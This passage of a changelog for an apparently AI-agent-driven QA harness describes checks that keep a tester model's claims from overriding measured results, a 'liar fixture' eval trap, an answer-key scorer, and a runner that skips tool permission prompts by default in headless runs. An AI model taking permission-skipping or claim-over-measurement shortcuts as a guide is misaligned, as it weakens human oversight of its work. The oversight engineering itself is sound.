naming how to make it count. A single cited test that still fails at HEAD refuses exactly
as before — there is a test that fails if that weakens.

**A copy has a source and a destination** (VERDICT-F-37). The strict bash guard counted
every non-flag argument of `cp`/`mv`/`rsync`/`install`/`ln` as a write target, so copying
the checkout into a scratch directory — the re-injection step the agent contract asks for
— was refused in the same words as overwriting source. Only the destination is a target
now, and `-t DIR` / `--target-directory=DIR` name it instead when present. Copying *into*
the checkout is refused exactly as before.

**The profile stopped contradicting itself** (VERDICT-F-38). Its "Real commands" section
said "no coverage tool is configured in this repo" six lines below the
`coverage_suite_cmd` that measured 85% of the diff on the run that filed the finding, and
"no tool present" for mutation testing while `mutmut` sits in the dev group. Both now say
what is true: the coverage command is named and run by the harness, and mutation testing
is a gap in coverage rather than an absent tool.

## 0.64.0 — 2026-09-02 · "silence is not evidence"

Both of run 7's Major findings are against the 0.62.0 ledger rule, three hours old.

**An inconclusive measurement is silence** (VERDICT-F-35). 0.62.0 demoted a claimed
fix-verification whenever the harness had *attempted* a measurement — and which test it
attempts is the prose lottery of VERDICT-F-26. The result was live in this repository's
own ledger: `F-32` and `F-33` recorded `confirmed` because their write-ups quote no node
id, `F-31` and `F-34` recorded `unknown` because theirs do and the harness ran them to
`pass → pass`. Four findings, hand-verified the same way by the same agent, two outcomes,
decided by whether the prose happened to contain a test id.

A measurement that says nothing now changes nothing. Only one that *contradicts* the claim
does — the guarding test still failing on the code being judged — and by then
`_apply_verification` has already reopened the finding.

**The tally says which of the two it counted** (VERDICT-F-36). `confirmed` covered both a
measured re-injection and the tester's own word, as one integer, under a caveat that read
"a finding resolved without re-injection stays undecided" — the opposite of what the code
did. `outcome_basis` is now recorded on the finding and in the ledger row, the calibration
block counts `confirmed_measured` and `confirmed_claimed` separately, and the reading names
the split: "27 of 30 held up (4 measured, 23 on the tester's word)". The caveat says what
the rule actually is.

Rows written before the field carry no basis and are left out of the split rather than
relabelled — defaulting them to `claimed` would rewrite history as the tester's word, and
there is a test that fails if they are.

## 0.63.0 — 2026-09-02 · "a test is not only its file"

The last two of run 6's four findings, both Minor, both in features shipped hours earlier.

**A regression test travels with its fixtures** (VERDICT-F-33). The copy-back into the
scratch checkout covered the cited test's own file and nothing else, so the shape that
lands most often — a regression test *and* the `conftest.py` fixture it needs, in one
commit — met an old commit that had never seen that fixture, errored there, and verified
nothing. Every `conftest.py` from the repository root down to the test's directory now
travels with it, listed in `support_copied_from_head` when the old copy differed or was
absent.

This one invalidated a test's premise rather than its rule. The scenario pinning "a summary
reading `1 failed, 1 error` classifies as error" was built on a fixture that *stayed
behind* — so the fix would have quietly turned that check into a tautology. The error now
comes from a fixture inside the test file whose body imports a function only the fix added:
copied back with the file, still unsatisfiable against the old source.

**A recurrence can be filed a run later** (VERDICT-F-34). `verdict-issues` keyed re-filing
on `delta`, which describes only the transition one run computed — so the window was
exactly one run wide, and a REGRESSED finding the tool did not happen to see on that run
could never be re-filed. The operator was told "already filed" while the issue sat closed.
The harness now stamps `regressed_at_run` on the finding and carries it forward; filing
compares it against the run recorded in the ledger, so the window stays open until the
recurrence is filed, and filing twice over one regression is still impossible. A state
written before this release still re-files from `delta`.

## 0.62.0 — 2026-09-02 · "measurement outranks the claim"

**The outcome ledger reads the measurement, not the flag** (VERDICT-F-32, filed by run 6).
`fix_verified` reaches a finding from two places — the harness sets it when its own
re-injection measured fail→pass, and a judgment may claim it for a re-injection done by
hand — and the rule that turns a resolution into a `confirmed` row could not tell them
apart. So the published track record, whose entire value is that the agent cannot
influence it, recorded a re-injection nobody ran. It is live in this repository's own
`outcomes.json`: `VERDICT-F-20` is `confirmed` with the reason "the guarding test failed
on re-injection", over a cited test that exists in no file here and was measured
error/error.

The 0.57.0 fix corrected the report and stopped one line short of the ledger the report
describes. Run 6 said so plainly: the report is honest now, and the ledger beneath it is
not.

Three arms, all mechanical:

- the harness measured fail→pass → `confirmed`, as before
- the harness measured and it did *not* show a fix → `unknown`, naming what it saw
  (`error → error`), whatever the flag says
- the harness measured nothing at all → the tester's claim stands and confirms, with a
  reason that says it was claimed

The third arm is deliberate. On a project the harness cannot measure, an evidenced claim
is the only evidence there is, and starving the ledger is how the track record died in the
first place — 95 of 110 Sales findings undecided. The over-correction is mutation-tested
alongside the defect.

The one wrong row already in this repository's ledger is left standing: a decided outcome
sticks, and rewriting a settled ledger by hand is a data decision for its owner, not a
side effect of a release.

## 0.61.0 — 2026-09-02 · "one unreadable file is not the whole measurement"

**Fixes a regression 0.60.0 shipped** (VERDICT-F-31, filed by run 6 against run 5's fix).
Measuring the suite's child processes means the children record whatever they run —
including files a test generated in a temp directory that no longer exists by the time
anything renders the database. `coverage json` aborts on the first source it cannot read,
so a single throwaway `conftest.py` took down the entire measurement: diff coverage went
from 63% measured at run 5 to `unavailable` at run 6, on a repository whose suite had not
changed shape.

The render now sets `ignore_errors`. That is proportion rather than indulgence: a file
whose source cannot be read is a file no line can be attributed to anyway, and a changed
file missing from the render still counts as wholly unexercised — the honest fallback that
was already there.

Verified where it broke, not only in a fixture: against this repository's own full suite
the measurement is back, at 246 of 275 changed lines executed (89%), with
`subprocess_coverage: measured` and 34 lines reached only in a child process. Among them,
28 of `issues.py`'s changed lines — the file run 5 reported as "0 executed, not imported
by anything the suite executed", which is the false claim 0.60.0 set out to fix.

The regression test builds the failure exactly as the field produced it: a child that
imports a generated file from a temp directory which is deleted before the render. It
fails without `ignore_errors`, with the same message the run recorded.

## 0.60.0 — 2026-09-02 · "the suite's children are the suite"

**Diff coverage measures the subprocesses a suite spawns** (VERDICT-F-28, the last of run
5's six). Coverage traces the process it starts and nothing else, so a suite that drives
its code through child processes measured none of it. Run 5 of this repository reported
217 changed lines of `issues.py` as "0 executed — not imported by anything the suite
executed" while eight tests exercised every one of those lines through a CLI subprocess.
The same for both hook files. That is a false statement rather than a gap, and it is one
the zero-coverage rule can turn into a refused pass on honest work.

The harness now points `COVERAGE_PROCESS_START` at a config of its own, whose static
`context` is `verdict:subprocess`; coverage's startup hook arms each Python child from
there. **Nothing is injected into the environment** — no `PYTHONPATH`, no
`sitecustomize`, no marker variable — and the parent process is measured exactly as
before: its import-time lines keep the empty context that keeps them from counting as
exercised, which is the 0.54.0 rule this could easily have broken.

A line only a child process reached counts as executed, is reported per file as
`executed_in_subprocess` and in total as `changed_lines_executed_in_subprocess`, and is
attributed to no test — there is no test context to attribute it to, and inventing one
would make the context string look like a node id. Where the installed coverage ships no
startup hook the children go unmeasured and `subprocess_coverage` reads `none recorded`:
a gap, stated as one.

Four mutations, four caught — including the one that matters most, that dropping the
child config leaves the false "0 executed" in place.

## 0.59.0 — 2026-09-02 · "a recurrence is news"

**`verdict-issues` files a finding that came back** (VERDICT-F-27, the last of run 5's six).
Dedupe was `fid in ledger` and nothing else. The finding id is minted once and never reused
by contract, so membership answers "has this finding ever been filed" — while the question
a tracker needs answered is "has this *occurrence* been filed". A REGRESSED finding, the
class the contract ranks first and the one most worth a human's attention, was therefore
never re-filed: the run printed it as "already filed" while its issue sat closed by
whoever fixed it the first time. The ledger even stored the discriminator, and nothing
ever read it back.

A recurrence is now filed again, once per regression. The guard is the run number the
ledger records, so running the tool twice over one state still files nothing twice. The
new issue's title says `(recurrence)`, its body links the issue it came back from, and the
ledger entry keeps a `previous` trail rather than overwriting it. Nothing closes or
comments on the old issue: that is a person's, and this tool still only ever creates.

## 0.58.0 — 2026-09-02 · "scratch is not record"

**The coverage run no longer writes into the QA root** (VERDICT-F-29). The rc file, the
coverage database and the rendered JSON went to `<qa_root>/coverage.*` — and in team mode
the QA root *is* the directory committed with the repository. Run 5 of this repository
left a 94,987,311-byte `coverage.json` there, gitignored by nothing and deleted by
nothing: one `git add .qa` from a permanent 95 MB blob in the history, where a
`.gitignore` line is no longer a remedy. All three now live in a temporary directory that
is removed when the measurement ends, whatever the outcome. A QA root that ran 0.53–0.57
may still hold one, so the three names are also listed in this repository's
`.qa/.gitignore`.

Two tests hold it: one asserts the QA root gains no `coverage*` file and that the scratch
directory this measurement created is gone, and one asserts the same of the repository
under test. Both fail when the intermediates are pointed back at the QA root.

Still open from run 5: F-28 (coverage is measured in-process only, so a test that
exercises its target through a subprocess reports every changed line unexercised) and
F-27 (`verdict-issues` dedupes on finding id, so a REGRESSED finding is never re-filed).

## 0.57.0 — 2026-09-02 · "a verification means something"

Run 5 of Verdict on itself was the first run of the fix-verification, diff-coverage and
artifact-check features shipped the day before. It verified six inherited fixes by
counterfactual, measured 63% of 1125 changed lines executed — and filed six findings
against those same features, all with evidence measured in that run. This release closes
the three that make a verification trustworthy.

**A citation is only a citation if the collector reported it** (VERDICT-F-26). The node-id
regex matches anywhere in a finding's evidence, including inside a quoted source snippet,
and the first match was simply run: selection by evidence *order*, not relevance. Run 5's
record for F-20 read `t.py::new` — a test that exists in no file in this repository. It
errored at both commits, and an error is not a measurement. Citations are now resolved
against the collected test-id ledger (exact, path-suffix, or parametrized base id); an id
the collector never reported is not run, and `verification_notes` names the finding and
the id. Projects without a `test_ids_cmd` have no ledger to check against and behave
exactly as before — the filter must not turn verification off to fix a scraping bug.

**The new test meets the old source, appended or not** (VERDICT-F-25). The copy-back into
the scratch checkout was file-level and conditional on absence, so the commonest real
shape — a regression test appended to a test file that already existed — left the old
file in place. That file does not contain the test, so `at_previous` read `error` and no
such fix could ever verify. The cited test's file now always comes from HEAD, which is
what the counterfactual asks for; `test_copied_from_head` still means the old copy
differed or was absent, so the flag keeps its meaning.

**The report counts measurements, not claims** (VERDICT-F-30). The `Fix verification:`
line selected its findings by the presence of a harness measurement and then counted them
by `fix_verified` — the one judgment field in the block. Run 5's own report therefore read
"1 verified · 0 measured but not verifiable" over a record measured error/error: the
arithmetic emptied the very bucket that would have shown it. The count now comes from
`at_previous`/`at_head` and the computed `delta`, and a finding claiming `fix_verified`
that its own measurement does not show is named on the line below.

Every rule is mutation-checked, each with a paired test that must keep passing when the
rule is reverted. Still open from run 5 and next: F-29 (the coverage run leaves a 95 MB
`coverage.json` in the committed QA root), F-28 (coverage is in-process only, so
subprocess-driven tests report their target as unexercised), F-27 (`verdict-issues`
dedupes on finding id, so a REGRESSED finding is never re-filed).

## 0.56.0 — 2026-09-02 · "findings meet the tracker"

**`verdict-issues` files each open finding as a GitHub issue, once.** The findings lived
in a state file only the QA loop read; the people who fix things live in the issue tracker.
Until these met, a finding waited for someone to open the report — on Sales, 75 open
findings waited across four runs. `verdict-issues [PROJECT_OR_PATH]` is a **dry run by
default**: it prints what would be filed, title by title, and creates nothing until
`--create`. Creation goes through the operator's own `gh` login — no token this tool holds
— worst severity first, capped by `--limit` (default 20), with optional `--label` and
`--repo`. A ledger beside the state, `issues.json`, records which finding became which
issue and is saved after every success, so a crash mid-run files nothing twice and a
re-run continues where a `gh` failure stopped. The state itself is never touched: it is
finalize's, and it is chain-signed. Each issue body carries the finding's evidence and a
`<!-- verdict-finding:ID -->` marker.

Not in this version, on purpose: closing or commenting on issues when findings resolve. A
closed issue is a human's claim; `fix_verified` is the harness's measurement, and the
tracker must not be able to overrule the ledger.

Eight tests against a stub `gh` that records what it was asked; three mutations caught
(dedupe off, ledger saved only at the end, dry run creating anyway).

## 0.55.0 — 2026-09-02 · "finalize reads its own artifacts back"

**The run-4 discipline, made mechanical.** Run 4 found two harness defects — a state
re-keyed to the directory name (F-23), an INDEX row dated from the local clock (F-24) —
not by reading source but by reading its own artifacts back and comparing them, and it
wrote the lesson down: *the state, the INDEX row, the runs.jsonl row and the report
describe one run and must agree; where they disagree, the harness composed a value
instead of measuring it.* That was the agent's habit. `verdict-finalize` does it now,
after every write, reading each artifact from disk rather than from the objects it meant
to write: the state on disk is the state just written; the history's last row carries
this run's number, verdict and signed link; the INDEX row carries the measured date, the
recorded project and the verdict; the report the state names exists and the INDEX links
it. A disagreement is a **warning on stderr** — the stream the agent reads — never a
refusal: the run is recorded and the state is valid, what is wrong is a renderer, and a
renderer defect is a finding against this harness to be filed.

Both renderers this catches are already fixed; this is what catches the next one. Seven
tests, each corrupting exactly one artifact after a real finalize.

## 0.54.0 — 2026-09-02 · "which changed lines any test executed"

**Diff coverage is measured now, at the grain of lines, functions and tests.** "Coverage
on changed files must not decrease" (§6) was a gate the agent could only declare
unmeasurable: the profile named a `coverage_cmd`, nothing ran it, and `coverage` in the
state was whatever the judgment wrote. Sales reported the gate unmeasurable four runs in a
row. `verdict-facts` now runs the suite once more under coverage.py with dynamic contexts
(`coverage_suite_cmd` in the profile; pytest-cov's `--cov-context=test` form is read too),
renders the database with `--show-contexts`, and intersects it with the added and modified
`.py` lines in the run's commit range. The state gets, per changed file, the unexercised
line ranges, the functions never entered, and the tests that touch the change — and, for
the run, the count no test executed. A changed file coverage never saw was imported by
nothing the suite ran; every line in it counts as unexercised, which is the honest reading.

**Executed means executed by a test.** A `def` line runs at import under the empty
context and proves nothing about the function it defines; counted, it let a brand-new,
never-called function read as partly exercised and kept the zero-exercised rule from ever
firing — the first version of the test for that rule failed against its own fixture for
exactly this reason. Import-time-only lines are unexercised.

**The one rule.** A clean `pass` over a change no test executed is refused by `validate` —
the same shape as a pass over an unreadable suite. Only on the measured zero; a diff with
some execution is the agent's §6 delta call. Measured coverage outranks a written block;
`status: unavailable` with a reason when there is no command, no commit range (a baseline)
or the database could not be rendered — said, never estimated. Per-test attribution is a
lower bound (a tracer may record a line under one context and skip it under the next);
"executed by any test" is exact, and that is what the rule is built on.

Ten tests on real two-commit repositories under a real tracer; five mutations caught,
including the import-time one. `coverage` joins the dev dependencies. Prompt untouched —
the measurement is the number §6 always asked for.

## 0.53.0 — 2026-09-02 · "the loop closes"

**The harness verifies fixes now.** `fix_verified` is the one judgment field that feeds the
track record, and it was almost never set — re-injecting a defect by hand is the step
every run skipped, so resolutions stayed `unknown` and the calibration ledger starved: 95
of 110 Sales findings undecided, no precision rate publishable. `verdict-facts` does the
re-injection the contract asks the tester to do: for every open finding with a cited test
(an explicit `verification_test`, or a pytest node id in its evidence) it runs that test at
HEAD and again in a scratch worktree of the previous run's commit, with the old source on
`PYTHONPATH` ahead of any installed copy. `merge` then does three mechanical things:

- **fail before, pass after, on a finding that resolves** — explicitly or by silence —
  stamps `fix_verified: true`, appends the measurement to the evidence, and the outcome is
  `confirmed`. A decided outcome the tester never had to assert.
- **still failing at HEAD refuses the resolution.** The finding stays open with
  `resolution_refused` naming the test. Neither a claim nor an absence can close a finding
  whose demonstrating test fails on the code being judged — measurement outranks both.
- everything else — `error`, `unavailable`, pass at both commits, no cited test, no
  `test_one_cmd` — is *not verifiable*, said so in the record, and changes nothing.

The classification reads the runner's parsed summary, never the exit code: a setup error
exits 1 exactly like a failing assertion, and read as `fail` at the old commit it would mint
a verification the code never earned. `error` outranks `failed` when both appear — pinned
by a test after a mutation showed the pure-collection-error case could not pin it. A test
the fix itself added is copied back to the old commit and marked `test_copied_from_head`;
a previous commit missing from the clone leaves `at_previous: unavailable` while the HEAD
half still runs. Bounded: 25 findings, 120 s per test run. The profile names how to run
one test (`test_one_cmd`, `{id}` for the node id); this repository's own profile now does.
`findings[].verification` and `resolution_refused` are written by `verdict-finalize` only —
a judgment carrying either is rejected. The prompt is untouched: the agent sees the
measurement in `facts.json` like every other number.

Thirteen tests on real two-commit repositories; five mutations caught.

## 0.52.0 — 2026-09-02 · "the instrument, measured by its own run"

Run 4 — the first signed run on this repository — filed three findings against the
harness that measured it, and its own artifacts were the evidence. All three fixed here,
plus a drift between the Stop hook and the gate that the same run exposed. Prompt untouched.

**VERDICT-F-20 (Major) — the set-diff count was capped by the display list.** The
test-id ledger caps `added`/`removed` at 50 for display, and the renderer took `len()` of
the capped list — so a mass deletion read as "−50" under a line claiming "set-diff, not
summary arithmetic". Live on run 4: **"+50" where the truth was +166**, and 377 + 50 does
not reconcile to 543. `added_count`/`removed_count` now come from the untruncated sets;
the lists stay capped, say so when they are, and a state from before the counts travelled
falls back to the old reading rather than crashing.

**VERDICT-F-23 (Major) — project identity ignored the profile.** The harness derived the
project key from the directory basename and never read the profile's `Project-Key:`. Run
4, executed from a clone named `verdict-clone`, **re-keyed this repository's committed
state and its INDEX to a second project name.** Team mode is exactly where this bites —
`.qa/` travels with the repo, so any clone, CI checkout or agent worktree with a different
directory name would do the same. §0's "the recorded key is authoritative" is mechanical
now: a profile `Project-Key:` (bold or bare, like `Repo-Path`) wins, then a previous
state's `project`, then the directory. `project_key_source` says which. Run 5 re-keys the
committed state back to `verdict` by itself.

**VERDICT-F-24 (Minor) — the INDEX row was composed, not measured.** Its date came from
`date.today()` on the local clock while every other stamp is UTC — on a UTC-7 host after
17:00 the row carried yesterday, permanently; run 4's says 09-01 against a state stamped
09-02T04:44Z. And the Δ-tests cell was the literal `n/a` whatever the set-diff measured.
Both now come from the state: the measured stamp, and the measured counts.

**The Stop hook and the gate disagreed on "went through the harness".** The hook required
all five `harness_signals` and promised `verdict-gate --require-harness` would exit 6 on
any gap; the gate decides on the three durable ones. A harness-produced state copied
between checkouts — its `facts.json`/`judgment.json` are per-run scratch git never carries
— tripped the hook, which then predicted a gate failure that did not happen. Seen on run
4's own state, copied from the clone that ran it. The hook now decides on `missing_durable`
like the gate, names the durable gap when it blocks, and stays out of the way when only a
session's scratch is elsewhere.

## 0.51.0 — 2026-09-01 · "three findings Verdict filed against itself"

The first self-run from a fresh clone came back `blocked` (see 0.50.1) — and in a
read-only pass with no gates and no hooks, the agent still filed three findings against
v0.50.0, re-verified them in a second pass, and held their ids in memory so a later run
would not re-mint them. All three are fixed here. The prompt is untouched.

**VERDICT-F-17 (Major) — the weakest run got the strongest verdict.** v0.49.0's rule
refused an unqualified `pass` when a gate ran and could not be parsed, and left `gates: {}`
alone — so a run that measured *nothing* passed clean while a run that measured something
unreadable was refused. `gates: {}` is overloaded: a design review with no suite and a
profile missing its gates block look identical. `verdict-facts` already says which
(`no_gates`); `merge` dropped it at the state boundary. The state carries it now and the
validator refuses the unqualified `pass` on it — which aligns the code with the agent
contract, which had said "report that and fix the profile" all along. A state with empty
gates and no `no_gates` predates the fact travelling and is left alone.

**VERDICT-F-18 (Minor) — `unknown` swallowed an observation.** `code_drift` returned
`unknown` both for a shallow clone that cannot see far enough and for a *complete* clone
that provably lacks the recorded commit — and every renderer is silent on `unknown`, by
v0.49.1's own design. The live instance was the self-run itself: the run-3 base commit was
a squash-merged branch head that no longer existed anywhere, the clone was complete, and a
two-day-old verdict was shown with no hint its base commit was unlocatable. A complete
clone missing a well-formed commit id is `absent` now: rendered in text and in the PR
comment, said by the SessionStart banner, and stale under `--max-commits-behind` like
divergence. Only for something shaped like a commit id — a garbled recorded sha is corrupt
input, not an observation, and garbage still never alarms.

**VERDICT-F-15, the remainder (Trivial)** — an unrecorded pass had minted this as F-19; run 4 folded it back into F-15, whose recorded title already named the two trees. The stale-command-name sweep now reaches `standards/` and
`templates/`, the two trees an agent reads *during* a run, with reach assertions so it
cannot quietly stop reaching them again.

Also: the runner's well-behaved test stub says `pass with risks`, because it runs no
gates — the F-17 rule caught the suite's own fixture.

**Scar:** the version bump for this release landed one commit after its content. The
`sed` that was meant to bump 0.50.1 → 0.51.0 targeted `0.50.1` while the branch still read
0.50.0, so the first `v0.51.0` tag built `verdict_qa_mcp-0.50.1` and PyPI refused it as a
duplicate. The same desync class as #56, reproduced by the author. The tag was re-pointed
at the bump commit; the release workflow now refuses a tag that disagrees with
`pyproject.toml` before it builds anything.

## 0.50.1 — 2026-09-01 · "a bare checkout could not run the agent"

**`verdict-run` now provisions what its own isolation hides.** It launches the session
with `--setting-sources project` — deliberate, so a run is reproducible and the
operator's user-scope plugins stay out — and that is exactly why a bare checkout could not
run the agent: the user-scope *Verdict* plugin stays out too. The first self-run from a
fresh clone came back `blocked` with "Agent type 'verdict' not found", no hooks
enforcing, and every tool call denied; the model ran the contract inline from
`agents/verdict.md`, self-imposed the guards, left the checkout clean, and reported its
own §13 self-check as failed rather than write state by hand. The right behaviour, in an
environment the runner had built wrong. The nightly script and `run_eval.py` each
hand-roll the same three missing steps; `docs/nightly.md` told everyone else to run
`verdict-run` bare.

The runner owns the steps now. Before launching it writes `.claude/agents/verdict.md` and
the hook set into `.claude/settings.local.json` — the file a project's `.gitignore`
conventionally excludes, so a tracked `settings.json` (this repository ships one) is never
dirtied — from the plugin root: `CLAUDE_PLUGIN_ROOT`, the checkout the runner lives in, or
the newest version in `~/.claude/plugins/cache`, for the common pairing of plugin-for-the-
editor plus `verdict-qa-mcp`-from-PyPI, whose wheel ships neither directory. Existing files
are the operator's: kept and named on stderr, never replaced. An explicit `--plugin-root`
is authoritative — a wrong path is exit 2, not a silent fallback to whatever checkout is
nearby. With no agent and no root it refuses **before** the model run, because that run
can only ever come back `blocked`. The session is launched with `project,local` so the
provisioned hooks come in, and with `--dangerously-skip-permissions` unless the operator
passes their own permission flag after `--`: headless means nobody can approve a tool
call, and the provisioned scope guards are the control that makes skipping the prompt
safe. `--no-provision` opts out.

Six tests — one of them rewritten after it turned out to be unfalsifiable: the checkout
fallback made the refusal unreachable from inside the checkout, which is what made an
explicit root authoritative in the first place.

## 0.50.0 — 2026-09-01 · "the paragraph, measured — and the instrument, fixed"

**The `full_sweep` prompt paragraph ships, eval-paid.** Held out of v0.48.0 because a prompt
edit is a behaviour change and the usage window looked closed for two days; it wasn't — a
one-line probe found it open the same afternoon. Measured on v0.49.1's harness: **liar 6/6
· 6/6 · 6/6, pricer delta 6/6**, against a control of 6/6 ×3 / 6/6 on the byte-identical
pre-paragraph prompt. The paragraph tells the agent to re-report every open finding by id,
that a scoped run's silence is *held* rather than read as resolution, and to declare
`full_sweep: true` only after a genuine whole-backlog sweep. Sales run 14 had already
exercised it once by accident — the nightly copied an uncommitted prompt — and wrote
"full_sweep is deliberately false so none of them is resolved by my silence" over 67
carried findings. That was n=1 on production; this is the measurement.

**The scorer under-scored by filing order.** The first reading of that liar triple was
**6/6 · 5/6 · 6/6**, and the 5 was the instrument. `score.py` claimed findings greedily in
answer-key order: the `pending-subtracts` row matches on the single term "pending", the
agent's *conftest* finding was classified `REAL_DEFECT` and quoted `pending(3, 2)` in its
counterfactual evidence, and because it was filed first the pending row took it — leaving
the conftest row, which the agent had answered at **Blocker**, with nothing. Runs 1 and 3
scored 6/6 only by filing in a luckier order. A scorer whose result depends on filing
order measures the order, not the agent — and this is the number releases are held or
shipped on; read naively, it would have called a clean prompt a regression. Row→finding
is now a maximum matching (Kuhn's augmenting paths) seeded in the old greedy order, so
every archived corpus run scores exactly as before and a row is re-routed only when that
frees a finding a later row would otherwise be starved of. Run 2's kept state re-scored
**6/6** under the fixed scorer with the assignment a human would make. The original
reading is kept in eval/README as a scar. A starved row's note now says its text match
was credited elsewhere, instead of reading as if nothing matched.

Both changes together, deliberately: the scorer fix is the evidence chain for the prompt
claim, and shipping them apart would let either be read without the other. 537 tests.

## 0.49.1 — 2026-09-01 · "reporting welded to enforcing"

**The gate now measures drift on every run and gates on it only when asked.**
`code_drift` was computed inside the `--max-commits-behind` branch, so a gate invoked
without that flag — which is exactly how the Action invokes it — could not say the verdict
described a different commit. No output format could show what was never computed.

Found on this repository's own PR comment, which advertised **VERDICT-F-10, F-11 and F-12
as `NEW · 0d`** while all three were fixed and released, against a state measured on
2026-08-30 over a sha range not in the branch. The SessionStart banner, computing the same
drift unconditionally, said so plainly. One surface knew; the surface an outside
contributor actually reads could not say it. Reporting welded to enforcing goes silent the
moment enforcing is off — the same shape as v0.49.0's unreadable gate, one layer out.

Text output gains a drift line; the PR comment gains a `> [!WARNING]` block placed
**above** the findings table, because every row beneath it has to be read differently once
you know the verdict was measured elsewhere, and a note under the table arrives after the
reader has already believed it. `--max-commits-behind` still gates exactly as before.
`code_drift` is now always recorded in the JSON output, `unknown` included, so a consumer
can tell "we looked and could not tell" from "we never looked" — and `unknown` is never
rendered, because a staleness note nobody can act on costs the real one its credibility.

Six tests, four mutations. Two of them survived the first version: the renderers already
stay quiet on `unknown`, and the text format has no `Stale:` prefix to assert on, so a
CLI-only test could not fail. The rule is now unit-tested at `_drift_note`, where it
lives — the same lesson as the Windows `shlex` guard.

## 0.49.0 — 2026-09-01 · "a check that cannot fire looks green"

Three validator defects, all found by pointing an 8B local model at the liar fixture
through the real harness. The agent prompt is again **byte-identical** — these are
harness-side rules, and the error messages carry their own remedy.

**A clean `pass` now needs a suite somebody could read.** `executed_nothing` is the
defence against a suite that collects tests and runs none of them, and it is arithmetic
over parsed counts — so it fires only when the runner's summary was legible. The liar
fixture's own entrypoint is `pytest -q >/dev/null; echo ALL TESTS PASSED; exit 0`, which
yields `counts_unparsed`; the defence never computed, and a `pass` with zero findings went
through `finalize` **and** `verdict-gate --require-harness` to **exit 0** over a suite in
which every test was skipped. The check was disabled by exactly what it guards against.
Proven by control: the same code behind a legible pytest gate reports
`executed_nothing: all 3 collected tests were skipped`. `validate` now refuses the
unqualified `pass` when **no gate in the run produced test counts**. Run-level, not
per-gate — which is what keeps it quiet: a lint or freshness gate legitimately parses to
no counts, and naming the test gate would need semantics the harness does not have. This
repository's own state is the case in point, carrying a parsed `suite` gate beside an
unparsed `fixture_freshness` one, and it validates clean. `pass with risks` stays
available; the rule refuses the unqualified verdict, not the run.

**`not_tested: []` was a rule stated and never enforced.** Both validators carried the
message *"an empty list is a claim of total coverage"* while checking only that the value
was a list. `[]` is a list — so a `pass` claiming total coverage travelled through
judgment, merge, state and gate untouched. Now refused on `pass` and `pass with risks`,
the two verdicts that let code ship. A `fail` or `blocked` run may still leave it empty.

**Evidence is cited so somebody can go and look.** Both validators checked that evidence
was *present*, never what it held, so `[{"file": "qstats.py", "line": 4}]` counted as a
cited finding — satisfying the check whose entire purpose is that a reader can follow the
citation. Entries must now be strings.

Eleven tests, each mutation-checked, each paired with the false-positive case that shapes
the rule. 529 tests.

Also in this release, from #56: `verdict-qa-mcp` is listed in the MCP Server Registry —
`server.json` (schema 2025-12-11, `io.github.ArtJack/verdict`) plus the `mcp-name`
ownership marker in `README-pypi.md`, which the registry reads from the PyPI description.
That is what claimed this version number: PyPI descriptions are immutable per release, so
the marker only reaches the registry through a new one. That change bumped `pyproject.toml`
and left `.claude-plugin/plugin.json` at 0.48.0; the two are supposed to move together, and
this release re-syncs them.

## 0.48.0 — 2026-09-01 · "silence is not a sweep"

Two features ported from a parallel working session that had written them against
v0.38.0 — nine releases behind — plus the integration that gap made necessary. Both are
harness changes; the agent prompt is **byte-identical to v0.47.0**, deliberately: the
companion prompt paragraph exists, but a prompt edit is eval-paid and the weekly usage
window is exhausted until Sep 3. It ships once it is measured, not before.

**A scoped run no longer resolves the backlog it never looked at.** A finding the
previous run had and this run does not mention is normally resolved — that is how a
backlog drains. But a merge gate over three files says nothing about the rest, and
production proved it the hard way: one scoped sales run resolved **62 open findings, 14
of them Critical, purely by not mentioning them**. Now, when more than half the incoming
open backlog goes unmentioned (and at least five findings do — below that, proportion is
noise), `merge` holds those findings `STILL_OPEN` with the reason on each
`carried_forward` instead of resolving them. A run that genuinely swept everything
declares `"full_sweep": true` on the judgment and gets silence-as-resolution back;
`validate_judgment` insists it be a real boolean, because a truthy string would grant
the licence by accident. Resolving explicitly (`status: "resolved"`) always works and
needs no flag. Holding open is the recoverable error: a stale open finding costs a
re-read, a wrongly-closed Critical costs the gate.

**Corrections in `runs.jsonl` now say which row won.** The history file is append-only
by design, and `validate` refuses a second finalize at a run number that did not advance
— so the retry path (restore `state.json` from `state.json.prev`, re-run) leaves the
superseded row on disk forever. Each rewrite is now stamped with a `revision`: the
correction generation, absent on generation zero so every pre-existing row is
byte-for-byte unchanged, one higher on each correction. `load_runs` awards a duplicated
run number to the highest generation instead of trusting file order — which one `sort`,
or one hand-appended row, used to be able to invert.

**The revision is signed, and the binding check knows it.** These features were written
before the v0.42.0 run-history chain existed, and colliding them naively would have
produced a false tamper alarm on every legitimate correction: the chain's state-binding
re-derives the history row from the state, and the state does not know its own
correction generation. Now the revision travels **inside the signed body** — so bumping
a stored row's revision to resurrect a superseded verdict breaks the chain loudly at the
walk — and `_chain_signal` reads the generation back off the signed row before
re-deriving. Three integration tests pin this: a correction keeps `chain_intact` true, a
tampered revision reads `broken`, and the chain extends over a correction (run 2 links
to the winner of run 1) rather than around it.

Also: `.env` joined `.gitignore`; `docs/state-schema.md` documents both features and the
retry flow that motivates them; six ported tests (the 62-finding production scenario
verbatim, the full-sweep licence, the ordinary 8-of-10 delta that must keep resolving,
rollback-then-correct, revision-beats-file-order, garbled-revision-never-wins) plus four
new ones (floor/share edges exact, a held backlog survives `validate`, and the chain
trio above). 518 tests.

## 0.47.0 — 2026-09-01 · "the eval-paid prompt release"

Three prompt/standards changes, none shipped on reasoning alone: a prompt edit is a
behaviour change, so this release is gated on measurement, and the order was strict —
measure the standing behaviour first, then edit, then measure again.

**The v0.43.0 debt, paid.** That release measured the liar fixture's
`conftest-skips-entire-suite` trap at **1 run in 3** and left it open, because fixing it
looked like a prompt change. It was not — `executed_nothing()` (v0.44.0) computes "every
collected test was skipped" in the harness. Re-measured here on a prompt byte-identical
to v0.43.0's: **6/6 three times, the trap caught 3 of 3.** A behavioural gap closed with
zero prompt change, exactly as the external reviewer predicted. (The n=3 has an honest
scar, recorded in eval/README: two runs of the first triple completed but their scores
were lost to an un-saved `tail` — the same silent data loss the v0.46.0 streaming runner
exists to prevent, hit while measuring.)

**`verified_intact` — confirmation is a deliverable.** The first external user checked
that his money's invariants held, the report said so mid-body where nobody reads, and
that confirmation is the thing a tester is actually paid for. Judgment may now carry
`verified_intact` — the invariants that were checked and HELD, each with evidence — and
`verdict-finalize` renders it as a **Verified intact** section placed right after the
release blockers, a headline rather than a footnote. Optional by design and the prompt
says so plainly: an empty list beats an invented entry, because a forced section is a
padded one.

**`Major` now means "fix today".** §10 and the severity standard both gain the interrupt
